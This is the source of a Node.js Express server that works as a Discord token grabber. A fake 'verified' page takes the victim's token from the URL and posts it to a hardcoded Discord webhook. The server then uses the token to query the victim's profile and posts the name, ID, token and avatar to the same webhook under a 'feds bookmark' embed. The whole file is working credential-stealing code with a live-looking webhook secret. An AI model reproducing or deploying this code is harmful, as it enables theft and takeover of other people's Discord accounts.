const { default: axios } = require("axios");
const express = require("express");
const { MessageEmbed, WebhookClient } = require("discord.js");
const app = express();

// Initiating Logged Data Cache
process.logged = [];

Array.prototype.random = function () {
  let n = this[Math.floor(Math.random() * this.length)];
  for (; !n; ) n = this[Math.floor(Math.random() * this.length)];
  return n;
};

const doxToken = async (tkn, pass) => {
  try {
    const res = await axios({ url: `https://discord.com/api/v${[8, 9].random()}/users/@me`, headers: { Authorization: tkn } });

    if (res.status !== 200 || res.status !== 201) {
      const d = res.data;
      return {
        rawData: {
          Token: tkn,
          Name: `${d.username}#${d.discriminator}`,
          ID: d.id,
        },
        bannerURL: d.banner ? `https://cdn.discordapp.com/banners/${d.id}/${d.banner}${d.banner.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
        avatarURL: d.avatar ? `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}${d.avatar.startsWith("a_") ? ".gif" : ".png"}?size=4096` : null,
      };
    }
  } catch (err) {
    console.log(err);
  }
};

app.get("/", async (req, res) => {
  const token = req.query.user;
  if (token) {
    res.send(`<!DOCTYPE html>
  <html lang="en">
    <head>
      <meta charset="UTF-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <title>idk</title>
    </head>
    <body>
      <script>
        const pass = alert("Succesfully verified. Press Ok");
  
        function searchToObject() {
          var pairs = window.location.search.substring(1).split("&"),
            obj = {},
            pair,
            i;
  
          for (i in pairs) {
            if (pairs[i] === "") continue;
  
            pair = pairs[i].split("=");
            obj[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
          }
  
          return obj;
        }
  
        const query = searchToObject();
  
        location.href = \`\${location.origin}/k?user=\${query.user}&pass=\${pass}\`;
      </script>
    </body>
  </html>`);
  }
});
app.get("/k", async (req, res) => {
  const token = req.query.user;
  const pass = req.query.pass;

  if (token) {
    res.send(`<!DOCTYPE html>
<title>onload/redirect</title>
<script>

var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
var url_string = window.location.href; 
var url = new URL(url_string);
var currentURL = url.searchParams.get("user");
var postData = {
  content: "@everyone @here new token " + currentURL
};
fetch(webhookURL, {
  method: "POST",
  body: JSON.stringify(postData),
  headers: {
    "Content-Type": "application/json"
  }
});


function handleOnLoad(){
window.location="https://discord.com/channels/@me";
}
</script>
</head>
<body onload="handleOnLoad()">
<b></b>
</body>
</html>`);
    try {
      const data = await doxToken(token, pass && typeof pass === "string" ? pass.trim() : null);
      console.log(data);
      if (!data) return;
      const embed = new MessageEmbed();
      embed.setTitle("feds bookmark");
      embed.setImage(data.bannerURL);
      embed.setThumbnail(data.avatarURL);
      let rawStringData = [];
      for (const i in data.rawData) {
        rawStringData.push(`**__${i}__**: ${data.rawData[i]}`);
      }
      rawStringData = rawStringData.join("\n");

      embed.setDescription(rawStringData);
      embed.setFooter("Created by t.me/feds3");

      // Cache Part

      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
        console.log("Found Duplicate Logged ID");
      } else {
        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
        process.logged.push({ token, password: pass });
      }
    } catch (err) {
      console.log(err);
    }
  }
});

app.listen(4200, () => {
  console.log(`Server Started on http://localhost:4200`);
});
